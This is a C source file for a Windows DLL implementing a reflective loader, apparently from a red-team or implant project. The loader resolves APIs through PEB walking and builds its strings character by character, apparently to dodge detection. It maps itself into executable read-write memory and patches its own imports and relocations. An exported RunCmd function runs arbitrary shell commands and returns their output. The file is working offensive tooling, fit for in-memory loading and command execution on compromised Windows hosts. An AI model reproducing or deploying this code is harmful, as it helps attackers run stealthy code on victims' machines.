#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "addresshunter.h"

typedef int(WINAPI *MESSAGEBOXA)(HWND, LPCTSTR, LPCTSTR, UINT32);
typedef int(WINAPI *PRINTF)(char *format, ...);
typedef HMODULE(WINAPI *LOADLIBRARYA)(LPCSTR lpLibFileName);
typedef LPVOID(WINAPI *VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)__builtin_return_address(0); }

// we declare some common stuff in here...
#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)
#define DLLEXPORT  __declspec( dllexport ) 

typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
typedef bool (WINAPI * DLLMAIN)( HINSTANCE, DWORD, LPVOID );
typedef DWORD (NTAPI * FLUSHINSTRUCTIONCACHE)( HANDLE, PVOID, ULONG );

typedef struct IMAGE_RELOC_
{
    WORD offset:12;
    WORD type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;

typedef struct API_
{
    UINT64 loadLibraryAFn;
    UINT64 messageBoxAFn;
    UINT64 VirtualAlloc;
    UINT64 FlushInstructionCache;
    UINT64 printf;
} API, *PAPI;

HINSTANCE hAppInstance = NULL;

DLLEXPORT CHAR* WINAPI RunCmd(CCHAR* cmd, PDWORD totalSize)
{
    FILE *fp;
    char *output = NULL;
    DWORD size = 0;
    *totalSize = 0;
    char buffer[1024];

    fp = popen(cmd, "r");

    if (fp == NULL)
    {
        perror("popen failed");
        return NULL;
    }

    // Read the output in chunks
    while (fgets(buffer, sizeof(buffer), fp) != NULL)
    {
        size = strlen(buffer);
        CHAR* temp = realloc(output, *totalSize + size + 1); // +1 for null terminator
        if (temp == NULL)
        {
            free(output); // Free previously allocated memory on failure
            perror("realloc failed");
            pclose(fp);
            return NULL;
        }
        output = temp;
        memcpy(output + *totalSize, buffer, size); // Copy the new data
        *totalSize += size;
        output[*totalSize] = '\0'; // Null-terminate the string
    }

    // Close the file pointer
    if (pclose(fp) == -1)
    { perror("pclose failed"); }

    // Return the dynamically allocated string
    return output;
}

DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
{
    UINT_PTR uiNewLibraryAddress;
    UINT_PTR uiHeaderValue;
    UINT_PTR uiExportDir;
    UINT_PTR uiNameArray;
    UINT_PTR uiAddressArray;

    API Api = { 0 };
    PAPI api = &Api;

    UINT64 kernel32dll;
    UINT64 user32dll;
    UINT64 msvcrtdll;

    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR msvcrt_c[] = { 'm','s','v','c','r','t', 0 };

    CHAR loadLibrary_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    CHAR FlushInstructionCache_c[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e', 0 };
    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };

    kernel32dll = GetKernel32();
    api->loadLibraryAFn = (UINT64)(GetSymbolAddress((HANDLE)kernel32dll, loadLibrary_c));

    user32dll = (UINT64)(((LOADLIBRARYA)(api->loadLibraryAFn))(user32_c));
    msvcrtdll = (UINT64)(((LOADLIBRARYA)(api->loadLibraryAFn))(msvcrt_c));

    api->messageBoxAFn = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    api->FlushInstructionCache = GetSymbolAddress((HANDLE)kernel32dll, FlushInstructionCache_c);

    CHAR a[] = { 'H', 'i', 0 };
    CHAR b[] = { 'R', 'l', 'L', 'o', 'a', 'd', 'e', 'r', 0 };
    ((MESSAGEBOXA)(api->messageBoxAFn))(0, a, b, 0x0000000L);

    char fPointer[] = { '%', 'p', '\n', 0 };
    char fString[] = { '%', 's', '\n', 0 };
    char fDword[] = { '%', 'd', '\n', 0 };

    ULONG_PTR uiLibraryAddress = caller();
    while( TRUE )
    {
        if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
        {
            uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
            // some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
            // we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
            if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
            {
                uiHeaderValue += uiLibraryAddress;
                // break if we have found a valid MZ/PE header
                if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
                { break; }
            }
        }
            uiLibraryAddress--;
    }

    uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

    api->VirtualAlloc = (UINT64)(GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c));
    uiNewLibraryAddress = (UINT_PTR)((VIRTUALALLOC)api->VirtualAlloc)( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

    /*
    OptionalHeader.SizeOfHeaders: The combined size of the following items, rounded to a multiple of the value specified in the FileAlignment member.

    e_lfanew member of IMAGE_DOS_HEADER
    4 byte signature
    size of IMAGE_FILE_HEADER
    size of optional header
    size of all section headers
    */
    UINT_PTR uiOldHeaderValue = uiLibraryAddress;
    UINT_PTR uiNewHeaderValue = uiNewLibraryAddress;
    DWORD dwSizeOfHeaders = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader;

    // Copy the headers from the initial location of the library
    while (dwSizeOfHeaders--)
    { *(BYTE *)uiNewHeaderValue++ = *(BYTE *)uiOldHeaderValue++; }

    UINT_PTR uiSections = (UINT_PTR)pOptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;
    DWORD dwNumberOfSections = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;

    UINT_PTR uiSectionVA;
    UINT_PTR uiSectionDataVA;
    DWORD dwSizeOfRawData;
    while (dwNumberOfSections--)
    {
        uiSectionVA = uiNewLibraryAddress + ((PIMAGE_SECTION_HEADER)uiSections)->VirtualAddress;
        uiSectionDataVA = uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiSections)->PointerToRawData;
        dwSizeOfRawData = ((PIMAGE_SECTION_HEADER)uiSections)->SizeOfRawData;
        while( dwSizeOfRawData-- )
        { *(BYTE *)uiSectionVA++ = *(BYTE *)uiSectionDataVA++; }
        uiSections += sizeof( IMAGE_SECTION_HEADER );
    }

    PIMAGE_DATA_DIRECTORY pImportDataDirectory = &((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(uiNewLibraryAddress + (pImportDataDirectory->VirtualAddress));

    PIMAGE_THUNK_DATA pFirstThunk;
    PIMAGE_THUNK_DATA pOriginalFirstThunk;
    HMODULE hLoadedLibrary;
    PIMAGE_IMPORT_BY_NAME pLoadedModuleName;

    while (pImportTable->Name)
    {
        ((PRINTF)api->printf)(fString, uiNewLibraryAddress + pImportTable->Name);

        hLoadedLibrary = ((LOADLIBRARYA)api->loadLibraryAFn)((LPCSTR)(uiNewLibraryAddress + (DWORD)pImportTable->Name));

        pFirstThunk = (PIMAGE_THUNK_DATA)(uiNewLibraryAddress + (ULONGLONG)pImportTable->FirstThunk);
        pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(uiNewLibraryAddress + (ULONGLONG)pImportTable->OriginalFirstThunk);
        while (DEREF(pFirstThunk))
        {
            // NOTE: 
            // If the high bit of the IMAGE_THUNK_DATA value is set, the bottom 63 bits for a 64-bit executable is treated as an ordinal value.
            // If the high bit isn't set, the IMAGE_THUNK_ DATA value is an RVA to the IMAGE_IMPORT_BY_NAME.
            //if (DEREF(pFirstThunk) & IMAGE_ORDINAL_FLAG)
            if (pOriginalFirstThunk && (pOriginalFirstThunk)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
            {
                CHAR warn[] = {'O', 'r', 'd', 'i', 'n', 'a', 'l', 'F', 'l', 'a', 'g', 'S', 'e', 't', 0};
                ((MESSAGEBOXA)api->messageBoxAFn)(0, warn, b, 0x0L);

                // get the VA of the modules NT Header
                uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

                // uiNameArray = the address of the modules export directory entry
                uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

                // get the VA of the export directory
                uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

                // get the VA for the array of addresses
                uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

                // use the import ordinal (- export ordinal base) as an index into the array of addresses
                uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)pOriginalFirstThunk)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

                // patch in the address for this imported function
                DEREF(pFirstThunk) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
            };

            pLoadedModuleName = (PIMAGE_IMPORT_BY_NAME)(uiNewLibraryAddress + (ULONGLONG)DEREF(pFirstThunk));
            DEREF(pFirstThunk) = (ULONG_PTR)GetSymbolAddress(hLoadedLibrary, (LPCSTR)(pLoadedModuleName->Name));

            //((PRINTF)api->printf)(fDword, sizeof( DWORD ));
            pFirstThunk += 1;
            pOriginalFirstThunk += 1;
        }
        pImportTable += 1;
    }

    uiLibraryAddress = uiNewLibraryAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
    PIMAGE_DATA_DIRECTORY pRelocDataDirectory = &((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

    PIMAGE_BASE_RELOCATION pRelocBlocks;
    UINT_PTR pRelocAppliedBase;
    DWORD dwNumberOfRelocs;
    PIMAGE_RELOC pRelocEntry;

    // Check if there are relocations
    if (pRelocDataDirectory->Size)
    {
        pRelocBlocks = (PIMAGE_BASE_RELOCATION)(uiNewLibraryAddress + pRelocDataDirectory->VirtualAddress);
        while (pRelocBlocks->SizeOfBlock)
        {
            pRelocAppliedBase = ( uiNewLibraryAddress + pRelocBlocks->VirtualAddress );
            dwNumberOfRelocs = ( pRelocBlocks->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
            pRelocEntry = (PIMAGE_RELOC)((UINT_PTR)pRelocBlocks + sizeof(IMAGE_BASE_RELOCATION));

            ((PRINTF)api->printf)(fDword, dwNumberOfRelocs);
            while (dwNumberOfRelocs--)
            {
                CHAR uh[] = {'T', 'y', 'p', 'e', ':', ' ', '%', 'd', '\n', 0};
                ((PRINTF)api->printf)(uh, pRelocEntry->type);
                if (pRelocEntry->type == IMAGE_REL_BASED_DIR64)
                { *(ULONG_PTR *)(pRelocAppliedBase + pRelocEntry->offset) += uiLibraryAddress; }
                else if(pRelocEntry->type == IMAGE_REL_BASED_ABSOLUTE )
                {
                    // ABSOLUTE is used for padding
                    continue;
                }
                else
                {
                    CHAR error[] = {'E', 'r', 'r', 'o', 'r', ':', ' ', 'U', 'n', 's', 'u', 'p', 'p', 'o', 'r', 't', 'e', 'd', 'R', 'e', 'l', 'o', 'c', 'T', 'y', 'p', 'e', 0};
                    ((MESSAGEBOXA)api->messageBoxAFn)(0, error, b, 0x0L);
                }
                pRelocEntry += 1;
            }
            pRelocBlocks = (PIMAGE_BASE_RELOCATION)((UINT_PTR)pRelocBlocks + pRelocBlocks->SizeOfBlock);
        }
    }

    UINT_PTR pEntryPoint = ( uiNewLibraryAddress + (((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint));

    ((FLUSHINSTRUCTIONCACHE)api->FlushInstructionCache)((HANDLE)-1, NULL, 0);
    
    ((DLLMAIN)pEntryPoint)((HINSTANCE)uiNewLibraryAddress, DLL_PROCESS_ATTACH, NULL);
    ((PRINTF)api->printf)(fPointer, pEntryPoint);

    return pEntryPoint;
}

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
    switch( dwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            break;
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
            { *(HMODULE *)lpReserved = hAppInstance; }
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}

